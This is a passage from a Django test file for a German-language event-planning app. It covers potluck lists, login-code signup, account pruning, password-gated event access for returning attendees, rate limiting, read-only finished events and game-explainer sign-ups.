    def test_claim_by_non_attendee_does_not_hide_unclaimed_badge(self):
        item = PotluckItem.objects.create(event=self.event, title="Salat", created_by=self.user)
        PotluckClaim.objects.create(item=item, user=self.user, quantity=1)

        response = self.client.get(f"/{self.event.pk}/")

        self.assertContains(response, '<span class="pill danger">Niemand bringt es mit</span>', html=True)

    def test_variable_quantity_with_no_attendees_is_not_shown_as_unspecified(self):
        PotluckItem.objects.create(
            event=self.event,
            title="Salat",
            variable_quantity=2,
            variable_per_persons=5,
            created_by=self.user,
        )

        response = self.client.get(f"/{self.event.pk}/")

        self.assertNotContains(response, "Keine Mindestmenge angegeben")
        self.assertNotContains(response, "Niemand bringt es mit")
        self.assertContains(response, '<span class="pill">vollständig</span>', html=True)
        self.assertContains(response, "Zusätzlich mitbringen")

    def test_unclaimed_badge_is_hidden_when_target_quantity_exists(self):
        PotluckItem.objects.create(
            event=self.event,
            title="Salat",
            needed_quantity=2,
            created_by=self.user,
        )

        response = self.client.get(f"/{self.event.pk}/")

        self.assertNotContains(response, "Niemand bringt es mit")


class ListAnchorRedirectTests(TestCase):
    def setUp(self):
        self.orga = User.objects.create(username="anchor-orga", email="orga-anchor@example.com")
        self.user = User.objects.create(username="anchor-user", email="anchor@example.com")
        self.event = Event.objects.create(title="Testevent", created_by=self.orga)
        self.day = EventDay.objects.create(event=self.event, date=datetime.date(2026, 9, 5))
        self.client = Client(SERVER_NAME="localhost")
        self.client.force_login(self.user)

    def assert_redirects_to_anchor(self, response, anchor):
        self.assertRedirects(
            response,
            f"/{self.event.pk}/#{anchor}",
            fetch_redirect_response=False,
        )
        detail = self.client.get(f"/{self.event.pk}/")
        self.assertContains(detail, f'id="{anchor}"')

    def test_attendance_section_anchor_is_visible_to_regular_users(self):
        self.assertFalse(self.event.can_manage(self.user))
        detail = self.client.get(f"/{self.event.pk}/")
        self.assertContains(detail, 'id="attendance-section"')

    def test_attendance_redirects_to_visible_section(self):
        response = self.client.post(
            f"/{self.event.pk}/anwesenheit/",
            {
                "name": "Teilnehmer",
                "role": "member",
                "days": [self.day.pk],
                "invited_by": "",
                "comment": "",
                "brought_people-TOTAL_FORMS": "0",
                "brought_people-INITIAL_FORMS": "0",
                "brought_people-MIN_NUM_FORMS": "0",
                "brought_people-MAX_NUM_FORMS": "1000",
            },
        )
        self.assert_redirects_to_anchor(response, "attendance-section")

    def test_decline_redirects_to_visible_section(self):
        response = self.client.post(f"/{self.event.pk}/absage/", {"comment": "Keine Zeit"})
        self.assert_redirects_to_anchor(response, "attendance-section")

    def test_creating_main_list_entries_redirects_to_new_entry(self):
        response = self.client.post(
            f"/{self.event.pk}/mitbringliste/neu/",
            {
                "title": "Salat",
                "needed_quantity": "",
                "variable_quantity": "",
                "variable_per_persons": "",
                "comment": "",
            },
        )
        item = PotluckItem.objects.get(event=self.event, title="Salat")
        self.assert_redirects_to_anchor(response, f"potluck-{item.pk}")

        response = self.client.post(f"/{self.event.pk}/ideen/neu/", {"text": "Turnier"})
        idea = Idea.objects.get(event=self.event, text="Turnier")
        self.assert_redirects_to_anchor(response, f"idea-{idea.pk}")

        response = self.client.post(f"/{self.event.pk}/fragen/neu/", {"text": "Wann?"})
        question = Question.objects.get(event=self.event, text="Wann?")
        self.assert_redirects_to_anchor(response, f"question-{question.pk}")

        response = self.client.post(
            f"/{self.event.pk}/slots/neu/",
            {
                "day": self.day.pk,
                "title": "Workshop",
                "description": "",
                "start_time": "17:00",
                "end_time": "18:00",
                "max_participants": 5,
            },
        )
        slot = Slot.objects.get(event=self.event, title="Workshop")
        self.assert_redirects_to_anchor(response, f"slot-{slot.pk}")

        response = self.client.post(
            f"/{self.event.pk}/dienste/neu/",
            {
                "title": "Aufbau",
                "description": "",
                "day": "",
                "start_time": "",
                "end_time": "",
                "needed_people": "",
            },
        )
        duty = Duty.objects.get(event=self.event, title="Aufbau")
        self.assert_redirects_to_anchor(response, f"duty-{duty.pk}")

    def test_potluck_claim_redirects_to_item(self):
        item = PotluckItem.objects.create(event=self.event, title="Salat")
        response = self.client.post(
            f"/mitbringliste/{item.pk}/claim/",
            {"quantity": 1, "comment": ""},
        )
        self.assert_redirects_to_anchor(response, f"potluck-{item.pk}")

    def test_slot_signup_and_comment_redirect_to_slot(self):
        slot = Slot.objects.create(
            event=self.event,
            day=self.day,
            title="Workshop",
            start_time=datetime.time(17, 0),
            end_time=datetime.time(18, 0),
            max_participants=5,
            created_by=self.user,
        )
        signup_response = self.client.post(f"/slots/{slot.pk}/anmelden/")
        self.assert_redirects_to_anchor(signup_response, f"slot-{slot.pk}")
        comment_response = self.client.post(f"/slots/{slot.pk}/kommentar/", {"text": "Dabei"})
        self.assert_redirects_to_anchor(comment_response, f"slot-{slot.pk}")

    def test_game_comment_redirects_to_game(self):
        game = GameEntry.objects.create(event=self.event, name="Catan", created_by=self.user)
        response = self.client.post(f"/spiele/{game.pk}/kommentar/", {"text": "Dabei"})
        self.assert_redirects_to_anchor(response, f"game-{game.pk}")

    def test_duty_signup_redirects_to_duty(self):
        duty = Duty.objects.create(event=self.event, title="Aufbau", created_by=self.user)
        response = self.client.post(f"/dienste/{duty.pk}/eintragen/")
        self.assert_redirects_to_anchor(response, f"duty-{duty.pk}")


class RequestLoginCodeOrSignupFormTests(TestCase):
    """Auto-Signup beim Anfordern eines Anmeldecodes für eine unbekannte
    E-Mail-Adresse (siehe events/account_forms.py)."""

    def _build_request(self):
        request = RequestFactory().post("/accounts/login/code/")
        SessionMiddleware(lambda r: None).process_request(request)
        request.session.save()
        return request

    def test_unknown_email_creates_exactly_one_unverified_account(self):
        with allauth_context.request_context(self._build_request()):
            form = RequestLoginCodeOrSignupForm(data={"email": "neu@example.com"})
            self.assertTrue(form.is_valid())

        users = User.objects.filter(email="neu@example.com")
        self.assertEqual(users.count(), 1)
        self.assertFalse(users.get().has_usable_password())
        self.assertEqual(EmailAddress.objects.filter(email="neu@example.com", verified=False).count(), 1)

    def test_known_email_reuses_existing_account(self):
        existing = User.objects.create(username="bekannt", email="bekannt@example.com")
        EmailAddress.objects.create(user=existing, email="bekannt@example.com", verified=True, primary=True)

        with allauth_context.request_context(self._build_request()):
            form = RequestLoginCodeOrSignupForm(data={"email": "bekannt@example.com"})
            self.assertTrue(form.is_valid())
            self.assertEqual(form._user.pk, existing.pk)

        self.assertEqual(User.objects.filter(email="bekannt@example.com").count(), 1)

    def test_concurrent_signup_race_does_not_leave_duplicate_accounts(self):
        """Simuliert zwei fast gleichzeitige Anfragen für dieselbe neue
        Adresse: Ein "konkurrierendes" Konto wurde von der anderen Anfrage
        bereits angelegt, bevor _get_or_create_user mit dem Anlegen des
        eigenen Kontos fertig ist. Da User.email/EmailAddress.email nicht
        DB-unique sind, würde ohne die Nachkontrolle in _get_or_create_user
        hier ein zweites, dauerhaft verwaistes Konto entstehen."""
        concurrent_user = User.objects.create(username="konkurrent", email="rennen@example.com")
        EmailAddress.objects.create(user=concurrent_user, email="rennen@example.com", verified=False, primary=True)

        with allauth_context.request_context(self._build_request()):
            form = RequestLoginCodeOrSignupForm(data={})
            survivor = form._get_or_create_user("rennen@example.com")

        self.assertEqual(survivor.pk, concurrent_user.pk)
        self.assertEqual(User.objects.filter(email="rennen@example.com").count(), 1)
        self.assertEqual(EmailAddress.objects.filter(email="rennen@example.com").count(), 1)


class LoginCodeViewIntegrationTests(TestCase):
    """End-to-End über die echten allauth-Views/-URLs statt direkt über die
    Form, damit auch Middleware/URL-Verdrahtung mitgetestet ist."""

    def test_request_login_code_for_unknown_email_signs_up_and_sends_code(self):
        client = Client(SERVER_NAME="localhost")
        response = client.post("/accounts/login/code/", {"email": "viaview@example.com"})

        self.assertEqual(response.status_code, 302)
        self.assertEqual(User.objects.filter(email="viaview@example.com").count(), 1)
        self.assertEqual(len(mail.outbox), 1)
        self.assertIn("viaview@example.com", mail.outbox[0].to)

    def test_main_login_form_signs_up_unknown_email_too(self):
        client = Client(SERVER_NAME="localhost")
        response = client.post("/accounts/login/", {"login": "hauptlogin@example.com"})

        self.assertEqual(response.status_code, 302)
        self.assertEqual(User.objects.filter(email="hauptlogin@example.com").count(), 1)

    def test_repeated_requests_for_same_new_email_reuse_one_account(self):
        client = Client(SERVER_NAME="localhost")
        client.post("/accounts/login/code/", {"email": "doppelt@example.com"})
        client.post("/accounts/login/code/", {"email": "doppelt@example.com"})

        self.assertEqual(User.objects.filter(email="doppelt@example.com").count(), 1)


class PruneUnconfirmedAccountsTests(TestCase):
    def setUp(self):
        self.old = timezone.now() - datetime.timedelta(days=10)

    def test_prunes_old_unverified_ghost_account(self):
        ghost = User.objects.create(username="ghost", email="ghost@example.com", date_joined=self.old)

        deleted = prune_unconfirmed_accounts(days=7)

        self.assertEqual(deleted, 1)
        self.assertFalse(User.objects.filter(pk=ghost.pk).exists())

    def test_keeps_recent_unverified_account(self):
        recent = User.objects.create(username="frisch", email="frisch@example.com")

        deleted = prune_unconfirmed_accounts(days=7)

        self.assertEqual(deleted, 0)
        self.assertTrue(User.objects.filter(pk=recent.pk).exists())

    def test_keeps_verified_account_even_if_old(self):
        verified = User.objects.create(username="bestaetigt", email="bestaetigt@example.com", date_joined=self.old)
        EmailAddress.objects.create(user=verified, email="bestaetigt@example.com", verified=True, primary=True)

        deleted = prune_unconfirmed_accounts(days=7)

        self.assertEqual(deleted, 0)
        self.assertTrue(User.objects.filter(pk=verified.pk).exists())

    def test_keeps_old_unverified_staff_account(self):
        staff = User.objects.create(
            username="staff", email="staff@example.com", is_staff=True, date_joined=self.old
        )

        deleted = prune_unconfirmed_accounts(days=7)

        self.assertEqual(deleted, 0)
        self.assertTrue(User.objects.filter(pk=staff.pk).exists())


class PruneUnconfirmedAccountsCommandTests(TestCase):
    def test_command_reports_and_deletes(self):
        User.objects.create(
            username="ghost2",
            email="ghost2@example.com",
            date_joined=timezone.now() - datetime.timedelta(days=30),
        )
        out = StringIO()
        call_command("prune_unconfirmed_accounts", stdout=out)

        self.assertIn("1 unbestätigte Konto(en) gelöscht.", out.getvalue())
        self.assertFalse(User.objects.filter(username="ghost2").exists())

    def test_command_respects_days_argument(self):
        User.objects.create(
            username="ghost3",
            email="ghost3@example.com",
            date_joined=timezone.now() - datetime.timedelta(days=3),
        )
        out = StringIO()
        call_command("prune_unconfirmed_accounts", "--days=1", stdout=out)

        self.assertFalse(User.objects.filter(username="ghost3").exists())


def _past_date(days=1):
    return timezone.localdate() - datetime.timedelta(days=days)


def _future_date(days=30):
    return timezone.localdate() + datetime.timedelta(days=days)


class KnownPersonModelTests(TestCase):
    """„Bekannte Person“ = Anmeldung (Attendance) bei einer bereits
    beendeten Veranstaltung (siehe models.is_known_person / Event.is_finished)."""

    def setUp(self):
        self.owner = User.objects.create(username="kp_orga", email="kp_orga@example.com")
        self.person = User.objects.create(username="kp_person", email="kp_person@example.com")

    def test_anonymous_user_is_never_known(self):
        from django.contrib.auth.models import AnonymousUser

        self.assertFalse(is_known_person(None))
        self.assertFalse(is_known_person(AnonymousUser()))
        self.assertFalse(is_known_person(self.person))

    def test_attendance_at_finished_event_makes_person_known(self):
        past = Event.objects.create(title="KP Vergangenheit", created_by=self.owner)
        EventDay.objects.create(event=past, date=_past_date())
        Attendance.objects.create(event=past, user=self.person)
        self.assertTrue(is_known_person(self.person))

    def test_attendance_at_running_event_does_not_make_person_known(self):
        running = Event.objects.create(title="KP Gemischt", created_by=self.owner)
        EventDay.objects.create(event=running, date=_past_date())
        EventDay.objects.create(event=running, date=_future_date())
        Attendance.objects.create(event=running, user=self.person)
        self.assertFalse(is_known_person(self.person))

    def test_decline_alone_does_not_make_person_known(self):
        past = Event.objects.create(title="KP Abgesagt", created_by=self.owner)
        EventDay.objects.create(event=past, date=_past_date())
        Decline.objects.create(event=past, user=self.person)
        self.assertFalse(is_known_person(self.person))

    def test_event_without_days_is_not_finished(self):
        event = Event.objects.create(title="KP Ohne Tage", created_by=self.owner, auto_readonly=True)
        self.assertFalse(event.is_finished)
        self.assertFalse(event.is_readonly)

    def test_event_ending_today_is_not_finished(self):
        event = Event.objects.create(title="KP Heute", created_by=self.owner, auto_readonly=True)
        EventDay.objects.create(event=event, date=timezone.localdate())
        self.assertFalse(event.is_finished)
        self.assertFalse(event.is_readonly)

    def test_event_today_after_end_time_is_finished(self):
        from datetime import timedelta

        now = timezone.localtime()
        event = Event.objects.create(title="KP Heute vorbei", created_by=self.owner, auto_readonly=True)
        EventDay.objects.create(
            event=event,
            date=now.date(),
            start_time=(now - timedelta(hours=2)).time(),
            end_time=(now - timedelta(hours=1)).time(),
        )
        self.assertTrue(event.is_finished)
        self.assertTrue(event.is_readonly)

    def test_attendance_at_event_finished_today_makes_person_known(self):
        from datetime import timedelta

        now = timezone.localtime()
        event = Event.objects.create(title="KP Heute gelaufen", created_by=self.owner)
        EventDay.objects.create(
            event=event,
            date=now.date(),
            start_time=(now - timedelta(hours=2)).time(),
            end_time=(now - timedelta(hours=1)).time(),
        )
        Attendance.objects.create(event=event, user=self.person)
        self.assertTrue(is_known_person(self.person))

    def test_event_with_only_past_days_is_finished_and_readonly(self):
        event = Event.objects.create(title="KP Gestern", created_by=self.owner, auto_readonly=True)
        EventDay.objects.create(event=event, date=_past_date())
        self.assertTrue(event.is_finished)
        self.assertTrue(event.is_readonly)


class KnownPersonAccessTests(TestCase):
    """Bekannte Personen dürfen bei Veranstaltungen mit
    allow_known_persons_signup ohne Zugangspasswort hinein."""

    def setUp(self):
        cache.clear()
        self.owner = User.objects.create(username="kpz_orga", email="kpz_orga@example.com")
        self.event = Event.objects.create(
            title="KPZ geschützt", created_by=self.owner, allow_known_persons_signup=True
        )
        self.event.set_access_password("heimaturlaub")
        self.event.save(update_fields=["access_password_hash"])
        past = Event.objects.create(title="KPZ Alt", created_by=self.owner)
        EventDay.objects.create(event=past, date=_past_date())
        self.stammgast = User.objects.create(username="kpz_stammgast", email="kpz_stammgast@example.com")
        Attendance.objects.create(event=past, user=self.stammgast)
        self.neuling = User.objects.create(username="kpz_neuling", email="kpz_neuling@example.com")

    def test_known_person_enters_without_password(self):
        client = Client(SERVER_NAME="localhost")
        client.force_login(self.stammgast)
        response = client.get(f"/{self.event.pk}/")
        self.assertEqual(response.status_code, 200)
        self.assertContains(response, "KPZ geschützt")
        self.assertTemplateNotUsed(response, "events/event_password.html")

    def test_known_person_can_write_without_password(self):
        client = Client(SERVER_NAME="localhost")
        client.force_login(self.stammgast)
        response = client.post(f"/{self.event.pk}/ideen/neu/", {"text": "Ohne Passwort"})
        self.assertEqual(response.status_code, 302)
        self.assertTrue(Idea.objects.filter(event=self.event, text="Ohne Passwort").exists())

    def test_unknown_visitor_still_needs_password(self):
        client = Client(SERVER_NAME="localhost")
        client.force_login(self.neuling)
        response = client.get(f"/{self.event.pk}/")
        self.assertTemplateUsed(response, "events/event_password.html")

    def test_anonymous_visitor_still_needs_password(self):
        client = Client(SERVER_NAME="localhost")
        response = client.get(f"/{self.event.pk}/")
        self.assertTemplateUsed(response, "events/event_password.html")

    def test_disabled_flag_requires_password_even_for_known_person(self):
        self.event.allow_known_persons_signup = False
        self.event.save(update_fields=["allow_known_persons_signup"])
        client = Client(SERVER_NAME="localhost")
        client.force_login(self.stammgast)
        response = client.get(f"/{self.event.pk}/")
        self.assertTemplateUsed(response, "events/event_password.html")

    def test_attendance_only_at_future_event_does_not_grant_access(self):
        future = Event.objects.create(title="KPZ Zukunft", created_by=self.owner)
        EventDay.objects.create(event=future, date=_future_date())
        Attendance.objects.create(event=future, user=self.neuling)
        client = Client(SERVER_NAME="localhost")
        client.force_login(self.neuling)
        response = client.get(f"/{self.event.pk}/")
        self.assertTemplateUsed(response, "events/event_password.html")


class EventAccessLoginCodeTests(TestCase):
    """End-to-End über die echten URLs: Anmeldecode am Veranstaltungszugang
    (events.views.event_access_code_request / EventAccessLoginCodeForm)."""

    def setUp(self):
        cache.clear()
        self.owner = User.objects.create(username="ec_orga", email="ec_orga@example.com")
        self.event = Event.objects.create(
            title="EC geschützt", created_by=self.owner, allow_known_persons_signup=True
        )
        self.event.set_access_password("strengheim")
        self.event.save(update_fields=["access_password_hash"])
        past = Event.objects.create(title="EC Alt", created_by=self.owner)
        EventDay.objects.create(event=past, date=_past_date())
        self.stammgast = User.objects.create(username="ec_stammgast", email="ec_stammgast@example.com")
        EmailAddress.objects.create(
            user=self.stammgast, email="ec_stammgast@example.com", verified=True, primary=True
        )
        Attendance.objects.create(event=past, user=self.stammgast)
        self.neuling = User.objects.create(username="ec_neuling", email="ec_neuling@example.com")
        EmailAddress.objects.create(user=self.neuling, email="ec_neuling@example.com", verified=True, primary=True)

    def _request_code(self, client, email="ec_stammgast@example.com"):
        return client.post(f"/{self.event.pk}/zugang/anmeldecode/", {"email": email})

    def _code_from_mail(self):
        match = re.search(r"^[A-Z]+(?:-[A-Z]+)+$", mail.outbox[0].body, re.MULTILINE)
        self.assertTrue(match, "Anmeldecode nicht in der E-Mail gefunden")
        return match.group(0)

    def test_gate_page_shows_email_form_when_enabled(self):
        client = Client(SERVER_NAME="localhost")
        response = client.get(f"/{self.event.pk}/")
        self.assertContains(response, "Anmeldung per E-Mail-Adresse")

    def test_gate_page_hides_email_form_when_disabled(self):
        self.event.allow_known_persons_signup = False
        self.event.save(update_fields=["allow_known_persons_signup"])
        client = Client(SERVER_NAME="localhost")
        response = client.get(f"/{self.event.pk}/")
        self.assertNotContains(response, "Anmeldung per E-Mail-Adresse")

    def test_get_is_rejected(self):
        client = Client(SERVER_NAME="localhost")
        response = client.get(f"/{self.event.pk}/zugang/anmeldecode/")
        self.assertEqual(response.status_code, 405)

    def test_known_person_receives_code_and_enters_event_after_login(self):
        client = Client(SERVER_NAME="localhost")
        response = self._request_code(client)
        self.assertEqual(response.status_code, 302)
        self.assertRegex(response["Location"], r"^/accounts/login/code/confirm/\?next=")
        self.assertEqual(len(mail.outbox), 1)
        self.assertIn("ec_stammgast@example.com", mail.outbox[0].to)

        response = client.post("/accounts/login/code/confirm/", {"code": self._code_from_mail()})
        self.assertEqual(response.status_code, 302)

        response = client.get(f"/{self.event.pk}/")
        self.assertEqual(response.status_code, 200)
        self.assertContains(response, "EC geschützt")
        self.assertTemplateNotUsed(response, "events/event_password.html")

    def test_wrong_code_is_rejected(self):
        client = Client(SERVER_NAME="localhost")
        self._request_code(client)
        response = client.post("/accounts/login/code/confirm/", {"code": "AAAA-AAAA"})
        self.assertEqual(response.status_code, 200)
        response = client.get(f"/{self.event.pk}/")
        self.assertTemplateUsed(response, "events/event_password.html")

    def test_unknown_email_gets_no_code_and_no_account_but_identical_response(self):
        client = Client(SERVER_NAME="localhost")
        known_response = self._request_code(client)
        unknown_response = client.post(f"/{self.event.pk}/zugang/anmeldecode/", {"email": "ec_fremd@example.com"})
        # Gleicher Status und gleiches Ziel wie bei einer bekannten Person,
        # damit sich bekannte und unbekannte Adressen nicht unterscheiden lassen.
        self.assertEqual(unknown_response.status_code, known_response.status_code)
        self.assertEqual(unknown_response["Location"], known_response["Location"])
        self.assertEqual(len(mail.outbox), 1)  # nur der Code für die bekannte Person
        self.assertFalse(User.objects.filter(email="ec_fremd@example.com").exists())

    def test_account_without_past_attendance_gets_no_code(self):
        client = Client(SERVER_NAME="localhost")
        response = self._request_code(client, email="ec_neuling@example.com")
        self.assertEqual(response.status_code, 302)
        self.assertEqual(len(mail.outbox), 0)

    def test_invalid_email_is_rejected_with_form_error(self):
        client = Client(SERVER_NAME="localhost")
        response = client.post(f"/{self.event.pk}/zugang/anmeldecode/", {"email": "keine-email"})
        self.assertEqual(response.status_code, 200)
        self.assertTemplateUsed(response, "events/event_password.html")
        self.assertEqual(len(mail.outbox), 0)

    def test_repeated_requests_for_same_email_are_rate_limited(self):
        client = Client(SERVER_NAME="localhost")
        for _ in range(3):
            response = self._request_code(client)
            self.assertEqual(response.status_code, 302)
        response = self._request_code(client)
        self.assertEqual(response.status_code, 200)
        self.assertTemplateUsed(response, "events/event_password.html")
        self.assertEqual(len(mail.outbox), 3)

    def test_event_without_flag_redirects_to_gate_without_sending(self):
        self.event.allow_known_persons_signup = False
        self.event.save(update_fields=["allow_known_persons_signup"])
        client = Client(SERVER_NAME="localhost")
        response = self._request_code(client)
        self.assertEqual(response.status_code, 302)
        self.assertEqual(response["Location"], f"/{self.event.pk}/")
        self.assertEqual(len(mail.outbox), 0)

    def test_event_without_password_redirects_to_gate_without_sending(self):
        open_event = Event.objects.create(title="EC offen", created_by=self.owner)
        client = Client(SERVER_NAME="localhost")
        response = client.post(f"/{open_event.pk}/zugang/anmeldecode/", {"email": "ec_stammgast@example.com"})
        self.assertEqual(response.status_code, 302)
        self.assertEqual(response["Location"], f"/{open_event.pk}/")
        self.assertEqual(len(mail.outbox), 0)


class EventReadonlyTests(TestCase):
    """Schreibschutz beendeter Veranstaltungen (Event.auto_readonly): alles
    bleibt einsehbar, Änderungen nur noch für die Orga (can_manage)."""

    def setUp(self):
        cache.clear()
        self.owner = User.objects.create(username="ro_orga", email="ro_orga@example.com")
        self.visitor = User.objects.create(username="ro_besucher", email="ro_besucher@example.com")
        self.event = Event.objects.create(title="RO Vorbei", created_by=self.owner, auto_readonly=True)
        EventDay.objects.create(event=self.event, date=_past_date())

    def test_reads_and_banner_stay_available(self):
        client = Client(SERVER_NAME="localhost")
        client.force_login(self.visitor)
        response = client.get(f"/{self.event.pk}/")
        self.assertContains(response, "RO Vorbei")
        self.assertContains(response, "beendet und schreibgeschützt")
        # Schreib-Buttons sind ausgeblendet
        self.assertNotContains(response, "Idee hinzufügen")
        self.assertNotContains(response, f'href="/{self.event.pk}/anwesenheit/"')
        self.assertNotContains(response, "Dienst anlegen")

    def test_event_list_shows_readonly_badge(self):
        client = Client(SERVER_NAME="localhost")
        response = client.get("/")
        self.assertContains(response, "Beendet · schreibgeschützt")

    def test_participant_writes_are_blocked(self):
        client = Client(SERVER_NAME="localhost")
        client.force_login(self.visitor)
        response = client.post(f"/{self.event.pk}/ideen/neu/", {"text": "Verboten"})
        self.assertEqual(response.status_code, 403)
        self.assertFalse(Idea.objects.filter(event=self.event, text="Verboten").exists())

        response = client.get(f"/{self.event.pk}/anwesenheit/")
        self.assertEqual(response.status_code, 403)

        duty = Duty.objects.create(event=self.event, title="Kasse")
        response = client.post(f"/dienste/{duty.pk}/eintragen/")
        self.assertEqual(response.status_code, 403)
        self.assertFalse(DutySignup.objects.filter(duty=duty, user=self.visitor).exists())

    def test_orga_can_still_write(self):
        client = Client(SERVER_NAME="localhost")
        client.force_login(self.owner)
        response = client.get(f"/{self.event.pk}/")
        self.assertContains(response, "Idee hinzufügen")
        response = client.post(f"/{self.event.pk}/ideen/neu/", {"text": "Orga darf"})
        self.assertEqual(response.status_code, 302)
        self.assertTrue(Idea.objects.filter(event=self.event, text="Orga darf").exists())

    def test_password_unlocks_reading_but_not_writing(self):
        self.event.set_access_password("altespasswort")
        self.event.save(update_fields=["access_password_hash"])
        client = Client(SERVER_NAME="localhost")
        client.force_login(self.visitor)
        client.post(f"/{self.event.pk}/", {"access_password": "altespasswort"})
        response = client.get(f"/{self.event.pk}/")
        self.assertEqual(response.status_code, 200)
        self.assertContains(response, "beendet und schreibgeschützt")
        response = client.post(f"/{self.event.pk}/ideen/neu/", {"text": "Trotzdem nicht"})
        self.assertEqual(response.status_code, 403)
        self.assertFalse(Idea.objects.filter(event=self.event, text="Trotzdem nicht").exists())

    def test_display_name_stays_changeable_on_readonly_event(self):
        client = Client(SERVER_NAME="localhost")
        client.force_login(self.visitor)
        response = client.post(f"/{self.event.pk}/anzeigename/", {"display_name": "Neuer Name"})
        self.assertEqual(response.status_code, 302)
        self.visitor.profile.refresh_from_db()
        self.assertEqual(self.visitor.profile.display_name, "Neuer Name")

    def test_future_event_with_flag_stays_writable(self):
        event = Event.objects.create(title="RO Zukunft", created_by=self.owner, auto_readonly=True)
        EventDay.objects.create(event=event, date=_future_date())
        client = Client(SERVER_NAME="localhost")
        client.force_login(self.visitor)
        response = client.post(f"/{event.pk}/ideen/neu/", {"text": "Noch offen"})
        self.assertEqual(response.status_code, 302)
        self.assertTrue(Idea.objects.filter(event=event, text="Noch offen").exists())

    def test_finished_event_without_flag_stays_writable(self):
        event = Event.objects.create(title="RO ohne Schutz", created_by=self.owner)
        EventDay.objects.create(event=event, date=_past_date())
        client = Client(SERVER_NAME="localhost")
        client.force_login(self.visitor)
        response = client.post(f"/{event.pk}/ideen/neu/", {"text": "Weiter schreibbar"})
        self.assertEqual(response.status_code, 302)
        self.assertTrue(Idea.objects.filter(event=event, text="Weiter schreibbar").exists())


class GameExplainClaimTests(TestCase):
    def setUp(self):
        self.owner = User.objects.create_user(username="explainer")
        self.other = User.objects.create_user(username="other-explainer")
        self.event = Event.objects.create(title="Erklärtest", created_by=self.owner)
        self.game = GameEntry.objects.create(event=self.event, name="Catan", created_by=self.owner)
        self.client = Client(SERVER_NAME="localhost")
        self.client.force_login(self.owner)

    def test_signup_is_independent_idempotent_and_visible(self):
        from .models import GameExplainClaim
        url = f"/spiele/{self.game.pk}/erklaeren/"
        self.assertEqual(self.client.get(url).status_code, 405)
        for _ in range(2):
            self.assertEqual(self.client.post(url).status_code, 302)
        self.assertEqual(GameExplainClaim.objects.filter(game=self.game).count(), 1)
        self.assertFalse(self.game.bring_claims.exists())
        GameExplainClaim.objects.create(game=self.game, user=self.other)
        response = self.client.get(f"/{self.event.pk}/")
        self.assertContains(response, "Erklärbären drucken")
        self.assertNotContains(response, "game-explain-overview")
        self.assertContains(response, "other-explainer")
        self.assertNotContains(response, "Ich kann das Spiel erklären")

    def test_cancel_permissions_and_button(self):
        from .models import GameExplainClaim
        claim = GameExplainClaim.objects.create(game=self.game, user=self.other)
        url = f"/spiele-erklaeren/{claim.pk}/zurueckziehen/"
        self.assertEqual(self.client.post(url).status_code, 403)
        self.client.force_login(self.other)
        self.assertEqual(self.client.post(url).status_code, 302)
        self.assertFalse(GameExplainClaim.objects.filter(pk=claim.pk).exists())
        self.assertContains(self.client.get(f"/{self.event.pk}/"), "Ich kann das Spiel erklären")

    def test_attendance_cleanup_removes_explanation(self):
        from .models import GameExplainClaim
        from .views import _cleanup_attendee_commitments
        GameExplainClaim.objects.create(game=self.game, user=self.owner)
        _cleanup_attendee_commitments(self.event, self.owner)
        self.assertFalse(GameExplainClaim.objects.filter(game=self.game).exists())

    def test_anonymous_cannot_signup(self):
        from .models import GameExplainClaim
        self.client.logout()
        self.assertEqual(self.client.post(f"/spiele/{self.game.pk}/erklaeren/").status_code, 302)
        self.assertFalse(GameExplainClaim.objects.exists())


    def test_bear_click_sets_and_removes_claim_via_json(self):
        from .models import GameExplainClaim
        url = f"/spiele/{self.game.pk}/erklaeren/status/"
        self.assertEqual(self.client.get(url).status_code, 405)
        response = self.client.get(f"/{self.event.pk}/")
        self.assertContains(response, f'data-explain-url="{url}"')
        self.assertContains(response, 'aria-pressed="false"')
        Attendance.objects.create(event=self.event, user=self.owner, name="Erklärer")
        for _ in range(2):
            response = self.client.post(url, {"explain": "1"}, HTTP_ACCEPT="application/json")
            self.assertEqual(response.status_code, 200)
        data = response.json()
        self.assertTrue(data["explaining"])
        self.assertEqual(data["count"], 1)
        self.assertTrue(data["mine"])
        self.assertIn("explainer", data["popup_html"])
        self.assertIn("Du bist als Erklärbär eingetragen.", data["popup_html"])
        self.assertIn("zurückziehen", data["section_html"])
        self.assertNotIn("Ich kann das Spiel erklären", data["section_html"])
        self.assertEqual(GameExplainClaim.objects.filter(game=self.game).count(), 1)
        self.assertContains(self.client.get(f"/{self.event.pk}/"), "game-explain-toggle is-mine")
        data = self.client.post(url, {"explain": "0"}, HTTP_ACCEPT="application/json").json()
        self.assertFalse(data["explaining"])
        self.assertEqual(data["count"], 0)
        self.assertIn("Ich kann das Spiel erklären", data["section_html"])
        self.assertFalse(GameExplainClaim.objects.filter(game=self.game).exists())

    def test_bear_click_only_removes_own_claim_and_flags_non_attendee(self):
        from .models import GameExplainClaim
        GameExplainClaim.objects.create(game=self.game, user=self.other)
        url = f"/spiele/{self.game.pk}/erklaeren/status/"
        self.client.post(url, {"explain": "0"}, HTTP_ACCEPT="application/json")
        self.assertTrue(GameExplainClaim.objects.filter(user=self.other).exists())
        data = self.client.post(url, {"explain": "1"}, HTTP_ACCEPT="application/json").json()
        self.assertTrue(data["explaining"])
        self.assertEqual(data["count"], 0)
        self.assertIn("erst mit", data["popup_html"])

    def test_bear_click_respects_readonly_and_login(self):
        url = f"/spiele/{self.game.pk}/erklaeren/status/"
        self.event.auto_readonly = True
        self.event.save(update_fields=["auto_readonly"])
        EventDay.objects.create(event=self.event, date=_past_date())
        self.client.force_login(self.other)
        self.assertEqual(self.client.post(url, {"explain": "1"}).status_code, 403)
        self.client.logout()
        self.assertEqual(self.client.post(url, {"explain": "1"}).status_code, 302)

    def test_bear_without_write_access_only_shows_popup(self):
        self.client.logout()
        response = self.client.get(f"/{self.event.pk}/")
        self.assertNotContains(response, "data-explain-url")
        self.assertContains(response, 'title="Erklärbären anzeigen"')

    def test_print_table_includes_all_games_and_explainers(self):
        from .models import GameExplainClaim
        GameExplainClaim.objects.create(game=self.game, user=self.owner)
        GameExplainClaim.objects.create(game=self.game, user=self.other)
        GameEntry.objects.create(event=self.event, name="Azul", created_by=self.owner)
        response = self.client.get(f"/{self.event.pk}/spiele/erklaerbaeren/drucken/")
        self.assertContains(response, 'class="game-list"')
        self.assertContains(response, "other-explainer")
        self.assertContains(response, 'class="badge badge-explainer"', count=2)
        self.assertContains(response, 'class="write-in"', count=4)
        self.assertContains(response, "@media print")
        html = response.content.decode()
        self.assertLess(html.index("Azul"), html.index("Catan"))

    def test_print_requires_event_access(self):
        self.event.set_access_password("secret")
        self.event.save()
        self.client.logout()
